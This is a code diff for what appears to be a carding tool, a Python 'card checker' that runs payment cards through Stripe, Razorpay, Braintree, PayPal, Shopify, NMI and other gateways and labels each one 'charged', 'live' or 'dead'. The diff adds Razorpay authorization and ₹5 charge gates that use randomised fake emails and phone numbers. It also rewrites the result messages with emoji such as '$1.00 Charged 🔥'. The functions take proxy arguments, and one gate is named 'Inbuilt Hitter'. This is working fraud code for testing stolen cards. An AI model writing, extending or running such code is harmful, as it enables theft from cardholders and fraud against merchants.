@@ -71,8 +71,8 @@ async def check_stripe(card: str, month: str, year: str, cvv: str, proxy=None) -
                 )
                 
                 if intent.status == "succeeded":
-                    return {"status": "charged", "amount": "$1.00", "response": "Success", "gate": "Stripe"}
-                return {"status": "live", "response": "Auth Success", "gate": "Stripe"}
+                    return {"status": "charged", "amount": "$1.00", "response": "$1.00 Charged Successfully 🔥", "gate": "Stripe"}
+                return {"status": "live", "response": "Auth Success (No Charge)", "gate": "Stripe"}
                 
             except stripe.error.CardError as e:
                 return {"status": "dead", "response": e.user_message, "gate": "Stripe"}
@@ -107,6 +107,122 @@ async def check_payu(card: str, month: str, year: str, cvv: str, proxy=None) -> 
         
     # PayU requires a server-side hash for checking
     return {"status": "declined", "response": "PayU Hashing required", "gate": "PayU"}
+
+async def check_razorpay(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
+    """Razorpay Auth Gate - Creates order and validates card (No charge)"""
+    if not RZP_KEY_ID or not RZP_KEY_SECRET:
+        return {"status": "error", "response": "Razorpay keys missing", "gate": "Razorpay Auth"}
+    
+    try:
+        def call_razorpay():
+            client = razorpay.Client(auth=(RZP_KEY_ID, RZP_KEY_SECRET))
+            
+            # Create a minimum order (₹1)
+            order = client.order.create({
+                "amount": 100,  # 1 INR in paise
+                "currency": "INR",
+                "receipt": f"test_{random.randint(10000, 99999)}",
+                "notes": {"purpose": "card_validation"}
+            })
+            
+            # Create payment with card details (Auth only)
+            payment_data = {
+                "amount": 100,
+                "currency": "INR",
+                "email": f"test{random.randint(1000, 9999)}@test.com",
+                "contact": f"+9199{random.randint(10000000, 99999999)}",
+                "order_id": order["id"],
+                "method": "card",
+                "card": {
+                    "number": card,
+                    "expiry_month": month,
+                    "expiry_year": year if len(year) == 4 else f"20{year}",
+                    "cvv": cvv,
+                    "name": "Test User"
+                }
+            }
+            
+            try:
+                # Try to create payment
+                payment = client.payment.create(payment_data)
+                if payment.get("status") == "authorized":
+                    return {"status": "approved", "response": "Card Authorized ✅", "gate": "Razorpay Auth"}
+                if payment.get("status") == "captured":
+                    return {"status": "charged", "response": "Payment Captured 🔥", "gate": "Razorpay Auth"}
+                return {"status": "live", "response": f"Status: {payment.get('status')}", "gate": "Razorpay Auth"}
+            except razorpay.errors.BadRequestError as e:
+                error_msg = str(e)
+                if "insufficient" in error_msg.lower():
+                    return {"status": "live", "response": "Insufficient Funds ✅", "gate": "Razorpay Auth"}
+                return {"status": "dead", "response": error_msg[:100], "gate": "Razorpay Auth"}
+        
+        loop = asyncio.get_event_loop()
+        return await loop.run_in_executor(None, call_razorpay)
+    except Exception as e:
+        return {"status": "error", "response": str(e)[:100], "gate": "Razorpay Auth"}
+
+async def check_razorpay_charge(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
+    """Razorpay Charge Gate - Attempts actual charge (₹5 ~$0.06)"""
+    if not RZP_KEY_ID or not RZP_KEY_SECRET:
+        return {"status": "error", "response": "Razorpay keys missing", "gate": "Razorpay Charge"}
+    
+    try:
+        def call_razorpay_charge():
+            client = razorpay.Client(auth=(RZP_KEY_ID, RZP_KEY_SECRET))
+            
+            # Create charge order (₹5 = ~$0.06)
+            order = client.order.create({
+                "amount": 500,  # 5 INR in paise
+                "currency": "INR", 
+                "receipt": f"chg_{random.randint(10000, 99999)}",
+                "notes": {"purpose": "charge_validation"}
+            })
+            
+            payment_data = {
+                "amount": 500,
+                "currency": "INR",
+                "email": f"charge{random.randint(1000, 9999)}@test.com",
+                "contact": f"+9199{random.randint(10000000, 99999999)}",
+                "order_id": order["id"],
+                "method": "card",
+                "card": {
+                    "number": card,
+                    "expiry_month": month,
+                    "expiry_year": year if len(year) == 4 else f"20{year}",
+                    "cvv": cvv,
+                    "name": "Test User"
+                }
+            }
+            
+            try:
+                payment = client.payment.create(payment_data)
+                
+                # If authorized, try to capture (this is the actual charge)
+                if payment.get("status") == "authorized":
+                    try:
+                        captured = client.payment.capture(payment["id"], 500)
+                        if captured.get("status") == "captured":
+                            return {"status": "charged", "response": "₹5 Charged Successfully 🔥", "gate": "Razorpay Charge"}
+                    except:
+                        return {"status": "live", "response": "Auth OK, Capture Failed ✅", "gate": "Razorpay Charge"}
+                
+                if payment.get("status") == "captured":
+                    return {"status": "charged", "response": "₹5 Charged 🔥", "gate": "Razorpay Charge"}
+                    
+                return {"status": "live", "response": f"Status: {payment.get('status')}", "gate": "Razorpay Charge"}
+                
+            except razorpay.errors.BadRequestError as e:
+                error_msg = str(e)
+                if "insufficient" in error_msg.lower():
+                    return {"status": "live", "response": "Insufficient Funds ✅", "gate": "Razorpay Charge"}
+                if "invalid" in error_msg.lower():
+                    return {"status": "dead", "response": "Invalid Card", "gate": "Razorpay Charge"}
+                return {"status": "dead", "response": error_msg[:100], "gate": "Razorpay Charge"}
+        
+        loop = asyncio.get_event_loop()
+        return await loop.run_in_executor(None, call_razorpay_charge)
+    except Exception as e:
+        return {"status": "error", "response": str(e)[:100], "gate": "Razorpay Charge"}
 
 async def check_braintree(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
     """Braintree Auth Gate (Cyborx Port)"""
@@ -164,9 +280,9 @@ async def check_braintree_charge(card: str, month: str, year: str, cvv: str, pro
             async with session.get(url, timeout=50) as resp:
                 text = await resp.text()
                 if "Payment successful" in text:
-                    return {"status": "charge", "response": "Payment Successful 🔥", "gate": "Braintree Charge"}
+                    return {"status": "charged", "amount": "$0.30", "response": "$0.30 Charged 🔥", "gate": "Braintree Charge"}
                 if "Insufficient Funds" in text:
-                    return {"status": "live", "response": "Insufficient Funds ✅", "gate": "Braintree Charge"}
+                    return {"status": "live", "response": "Insufficient Funds (Live) ✅", "gate": "Braintree Charge"}
                 return {"status": "dead", "response": "Declined", "gate": "Braintree Charge"}
     except Exception as e:
         return {"status": "error", "response": str(e), "gate": "Braintree Charge"}
@@ -233,9 +349,9 @@ async def check_nmi(card: str, month: str, year: str, cvv: str, proxy=None) -> d
             async with session.get(url, proxy=proxy, timeout=30) as resp:
                 text = await resp.text()
                 if "success" in text.lower():
-                    return {"status": "charged", "response": "Charged 1$", "gate": "NMI"}
+                    return {"status": "charged", "amount": "$1.00", "response": "$1.00 Charged 🔥", "gate": "NMI"}
                 if "Error: 225" in text or "Error: 202" in text:
-                    return {"status": "live", "response": "Live (Mismatch/Low Balance)", "gate": "NMI"}
+                    return {"status": "live", "response": "Live (Low Balance/Mismatch) ✅", "gate": "NMI"}
                 return {"status": "dead", "response": text[:100], "gate": "NMI"}
     except Exception as e:
         return {"status": "error", "response": str(e), "gate": "NMI"}
@@ -248,9 +364,9 @@ async def check_payflow(card: str, month: str, year: str, cvv: str, proxy=None) 
             async with session.get(url, proxy=proxy, timeout=30) as resp:
                 text = await resp.text()
                 if "COMPLETED" in text or "successful" in text:
-                    return {"status": "charged", "response": "Payment Success", "gate": "Payflow"}
+                    return {"status": "charged", "amount": "~$1.00", "response": "~$1 Charged 🔥", "gate": "Payflow"}
                 if "Mismatch" in text or "15004" in text:
-                    return {"status": "live", "response": "CVV Mismatch / Live", "gate": "Payflow"}
+                    return {"status": "live", "response": "CVV Mismatch (Live) ✅", "gate": "Payflow"}
                 return {"status": "dead", "response": text[:100], "gate": "Payflow"}
     except Exception as e:
         return {"status": "error", "response": str(e), "gate": "Payflow"}
@@ -272,11 +388,11 @@ async def check_shopify_auth(card: str, month: str, year: str, cvv: str, proxy=N
                 async with session.get(url, timeout=60, headers=headers) as resp:
                     text = await resp.text()
                     if any(x in text for x in ["ORDER_PLACED", "Thank you", "success", "ProcessedReceipt"]):
-                        return {"status": "charged", "response": "Order Placed (API) 🔥", "gate": "Shopify Auth API"}
+                        return {"status": "charged", "amount": "$1-5", "response": "$1-5 Order Placed 🔥", "gate": "Shopify Auth API"}
                     if any(x in text for x in ["3DS_REQUIRED", "authentications", "3D CC"]):
-                        return {"status": "live", "response": "3DS Required (API)", "gate": "Shopify Auth API"}
+                        return {"status": "live", "response": "3DS Required (Live) ✅", "gate": "Shopify Auth API"}
                     if "INCORRECT_CVC" in text or "INSUFFICIENT_FUNDS" in text:
-                        return {"status": "live", "response": text[:50], "gate": "Shopify Auth API"}
+                        return {"status": "live", "response": "CVC/Funds Issue (Live) ✅", "gate": "Shopify Auth API"}
                     # Fallback to native if API is weird, or just return dead. 
                     # Returning dead for now to trust API result.
                     return {"status": "dead", "response": "Declined (API)", "gate": "Shopify Auth API"}
@@ -307,11 +423,11 @@ async def check_paypal(card: str, month: str, year: str, cvv: str, proxy=None) -
             async with session.get(url, proxy=proxy, timeout=50) as resp:
                 text = await resp.text()
                 if any(x in text for x in ["COMPLETED", "Payment Successful"]):
-                    return {"status": "charged", "response": "Your payment successful 🔥", "gate": "PayPal 1$"}
+                    return {"status": "charged", "amount": "$1.00", "response": "$1.00 Charged 🔥", "gate": "PayPal 1$"}
                 if "CVV2_FAILURE" in text:
-                    return {"status": "live", "response": "CVV2 FAILURE ✅", "gate": "PayPal 1$"}
+                    return {"status": "live", "response": "CVV2 Mismatch (Live) ✅", "gate": "PayPal 1$"}
                 if "INSUFFICIENT_FUNDS" in text:
-                    return {"status": "live", "response": "INSUFFICIENT FUNDS ✅", "gate": "PayPal 1$"}
+                    return {"status": "live", "response": "Insufficient Funds (Live) ✅", "gate": "PayPal 1$"}
                 return {"status": "dead", "response": "Declined", "gate": "PayPal 1$"}
     except Exception as e:
         return {"status": "error", "response": str(e), "gate": "PayPal 1$"}
@@ -327,9 +443,9 @@ async def check_paypal_avs(card: str, month: str, year: str, cvv: str, proxy=Non
             async with session.get(url, proxy=proxy, timeout=50) as resp:
                 text = await resp.text()
                 if any(x in text for x in ["COMPLETED", "Payment successful"]):
-                    return {"status": "charge", "response": "Payment successful 🔥", "gate": "PayPal AVS"}
+                    return {"status": "charged", "amount": "$1.00", "response": "$1.00 Charged 🔥", "gate": "PayPal AVS"}
                 if "CVV = D" in text or "0051" in text:
-                    return {"status": "live", "response": text[:50], "gate": "PayPal AVS"}
+                    return {"status": "live", "response": "CVV/AVS Mismatch (Live) ✅", "gate": "PayPal AVS"}
                 return {"status": "dead", "response": "Declined", "gate": "PayPal AVS"}
     except Exception as e:
         return {"status": "error", "response": str(e), "gate": "PayPal AVS"}
@@ -462,9 +578,9 @@ async def check_fastspring_charge(card: str, month: str, year: str, cvv: str, pr
             async with session.post(pay_url, json=pay_data, headers={"x-session-token": token, "User-Agent": ua}, proxy=proxy) as resp:
                 res_pay = await resp.text()
                 if "/complete" in res_pay:
-                    return {"status": "charge", "response": "Payment Successful $10 🔥", "gate": "FastSpring Charge"}
+                    return {"status": "charged", "amount": "$10", "response": "$10 Charged 🔥", "gate": "FastSpring Charge"}
                 if "url3ds" in res_pay:
-                    return {"status": "live", "response": "3DS Required ✅", "gate": "FastSpring Charge"}
+                    return {"status": "live", "response": "3DS Required (Live) ✅", "gate": "FastSpring Charge"}
                 
                 msg = re.search(r'"phrase":"([^"]+)"', res_pay)
                 return {"status": "dead", "response": msg.group(1) if msg else "Declined", "gate": "FastSpring Charge"}
@@ -578,9 +694,9 @@ async def check_stripe_sk(card: str, month: str, year: str, cvv: str, proxy=None
             async with session.get(url, timeout=60) as resp:
                 text = await resp.text()
                 if "approved" in text.lower() or "success" in text.lower():
-                    return {"status": "charge", "response": "Payment Successful 🔥", "gate": f"Stripe SK ({charge_type.upper()})"}
+                    return {"status": "charged", "amount": "$1.00", "response": "$1.00 Charged 🔥", "gate": f"Stripe SK ({charge_type.upper()})"}
                 if any(x in text.lower() for x in ["cvc_check: pass", "cvv live", "insufficient_funds", "requires_action"]):
-                    return {"status": "live", "response": "Live ✅", "gate": f"Stripe SK ({charge_type.upper()})"}
+                    return {"status": "live", "response": "Live (CVV/Funds) ✅", "gate": f"Stripe SK ({charge_type.upper()})"}
                 return {"status": "dead", "response": "Declined", "gate": f"Stripe SK ({charge_type.upper()})"}
     except Exception as e:
         return {"status": "error", "response": str(e), "gate": f"Stripe SK ({charge_type.upper()})"}
@@ -597,9 +713,9 @@ async def check_stripe_nonsk(card: str, month: str, year: str, cvv: str, proxy=N
             async with session.get(url, timeout=60) as resp:
                 text = await resp.text()
                 if "Payment Successful" in text or "succeeded" in text:
-                    return {"status": "charge", "response": "Payment Successful 🔥", "gate": f"Stripe NonSK (API {api_version})"}
+                    return {"status": "charged", "amount": "$1-5", "response": "$1-5 Charged 🔥", "gate": f"Stripe NonSK (API {api_version})"}
                 if any(x in text for x in ["requires_action", "insufficient_funds", "incorrect_cvc"]):
-                    return {"status": "live", "response": "Live ✅", "gate": f"Stripe NonSK (API {api_version})"}
+                    return {"status": "live", "response": "Live (CVV/3DS) ✅", "gate": f"Stripe NonSK (API {api_version})"}
                 return {"status": "dead", "response": "Declined", "gate": f"Stripe NonSK (API {api_version})"}
     except Exception as e:
         return {"status": "error", "response": str(e), "gate": f"Stripe Non-SK (V{api_version})"}
@@ -615,9 +731,9 @@ async def check_stripe_inbuilt(card: str, month: str, year: str, cvv: str, pk: s
             async with session.get(url, timeout=60) as resp:
                 text = await resp.text()
                 if "Payment Successful" in text:
-                    return {"status": "charge", "response": "Charged Successfully 🔥", "gate": "Inbuilt Hitter"}
+                    return {"status": "charged", "amount": "$1-10", "response": "$1-10 Charged 🔥", "gate": "Inbuilt Hitter"}
                 if any(x in text for x in ["insufficient_funds", "incorrect_cvc", "stripe_3ds2_fingerprint"]):
-                    return {"status": "live", "response": "Live ✅", "gate": "Inbuilt Hitter"}
+                    return {"status": "live", "response": "Live (CVV/3DS) ✅", "gate": "Inbuilt Hitter"}
                 return {"status": "dead", "response": "Declined", "gate": "Inbuilt Hitter"}
     except Exception as e:
         return {"status": "error", "response": str(e), "gate": "Inbuilt Hitter"}
